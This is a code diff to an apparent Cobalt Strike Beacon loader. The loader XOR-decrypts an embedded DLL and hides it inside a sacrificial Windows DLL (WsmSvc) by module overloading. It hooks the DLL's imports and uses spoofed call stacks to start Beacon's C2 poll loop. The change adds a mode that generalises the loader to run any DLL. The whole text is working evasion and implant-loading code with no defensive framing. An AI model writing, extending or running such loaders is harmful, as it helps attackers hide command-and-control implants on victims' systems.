@@ -26,6 +26,13 @@ extern PVOID calculate_function_stack_size_wrapper(PVOID return_address);
 
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 
+/* ── Universal DLL Loader Configuration ────────────────────────── */
+/* Set to 1 to support any Windows DLL (not just Beacon)
+   Set to 0 for Beacon-specific optimizations (default) */
+#ifndef UNIVERSAL_DLL_MODE
+#define UNIVERSAL_DLL_MODE 0
+#endif
+
 /* ── Crystal Palace embedded sections ─────────────────────────────── */
 
 char __DLLDATA__ [0] __attribute__((section("cobalt_dll")));
@@ -201,7 +208,7 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
     funcs.LoadLibraryA   = LoadLibraryA;
     funcs.GetProcAddress = GetProcAddress;
 
-    /* XOR-decrypt Beacon */
+    /* XOR-decrypt DLL */
     RESOURCE * masked_dll = (RESOURCE *)findAppendedDLL();
     RESOURCE * mask_key   = (RESOURCE *)findMask();
 
@@ -221,7 +228,7 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
         return;
     }
 
-    /* Size check — sacrificial DLL must fit Beacon's full image */
+    /* Size check — sacrificial DLL must fit DLL's full image */
     PIMAGE_NT_HEADERS pSacNt = (PIMAGE_NT_HEADERS)(
         (ULONG_PTR)hSacrificial +
         ((PIMAGE_DOS_HEADER)hSacrificial)->e_lfanew);
@@ -250,11 +257,11 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
             secSize, PAGE_READWRITE, &oldProt);
     }
 
-    /* Zero target region — clears WsmSvc content so Beacon's BSS
+    /* Zero target region — clears WsmSvc content so DLL's BSS
      * globals start at zero rather than WsmSvc garbage              */
     NTDLL$memset((char *)hSacrificial, 0, beaconSize);
 
-    /*  Copy Beacon — LoadDLL handles headers, sections, relocations */
+    /*  Copy DLL — LoadDLL handles headers, sections, relocations */
     LoadDLL(&cobaltData, dll_raw_src, (char *)hSacrificial);
 
     /* Load PICO  */
@@ -280,9 +287,9 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
                                   __tag_setup_hooks()))(&funcs);
     
     /* ProcessImports with hooked funcs.
-     * When Beacon's import table is resolved, every call to
+     * When DLL's import table is resolved, every call to
      * _GetProcAddress("Sleep") returns _Sleep, ("ExitThread") returns
-     * _ExitThread etc — wiring all hooks into Beacon's live IAT.     */
+     * _ExitThread etc — wiring all hooks into DLL's live IAT.     */
     ProcessImports(&funcs, &cobaltData, (char *)hSacrificial);
 
     /* Fix section permissions and track for sleep mask */
@@ -297,7 +304,7 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
     fix_section_permissions(&cobaltData, dll_raw_src,
                              (char *)hSacrificial, &memory.Dll);
 
-    /* Register .pdata so unwinder can walk Beacon frames */
+    /* Register .pdata so unwinder can walk DLL frames */
     IMAGE_DATA_DIRECTORY * pExcept =
         &cobaltData.NtHeaders->OptionalHeader
              .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
@@ -321,9 +328,37 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
     DLLMAIN_FUNC entry = EntryPoint(&cobaltData, (char *)hSacrificial);
     KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);
 
-    /* reason=1 — decrypts Beacon config, returns */
-    //entry((HINSTANCE)hSacrificial, DLL_PROCESS_ATTACH, NULL);
+    /* ─────────────────────────────────────────────────────────────
+       Universal DLL Mode: Choose execution model based on compilation flag
+       ───────────────────────────────────────────────────────────── */
 
+#if UNIVERSAL_DLL_MODE
+
+    /* ✅ UNIVERSAL DLL MODE
+       Standard Windows DLL execution:
+       - Single DLL_PROCESS_ATTACH call
+       - DLL executes and returns normally
+       - Supports any standard Windows DLL */
+    
+    FUNCTION_CALL call = { 0 };
+    call.ptr     = (PVOID) entry;
+    call.argc    = 3;
+    call.args[0] = (ULONG_PTR) hSacrificial;
+    call.args[1] = (ULONG_PTR) DLL_PROCESS_ATTACH;
+    call.args[2] = (ULONG_PTR) NULL;
+    spoof_call(&call);
+    
+    /* For universal DLL, execution ends here after DllMain completes
+       Control returns to the caller - standard Windows DLL behavior */
+
+#else
+
+    /* ❌ BEACON MODE (Default)
+       Beacon-specific two-phase execution:
+       - Phase 1: DLL_PROCESS_ATTACH for initialization
+       - Phase 2: reason=0x4 for C2 poll loop (never returns) */
+    
+    /* Phase 1: reason=1 — decrypts Beacon config, returns */
     FUNCTION_CALL call = { 0 };
     call.ptr     = (PVOID) entry;
     call.argc    = 3;
@@ -332,8 +367,10 @@ void ModuleOverload(IN LPCWSTR SacrificialDllPath) {
     call.args[2] = (ULONG_PTR) NULL;
     spoof_call(&call);
 
-    /* reason=4 — C2 poll loop via clean fake stack, never returns */
+    /* Phase 2: reason=4 — Beacon's C2 poll loop via clean fake stack, never returns */
     TransferExecutionViaStack((PVOID)entry, hSacrificial, 0x4);
+
+#endif
     
 }
 
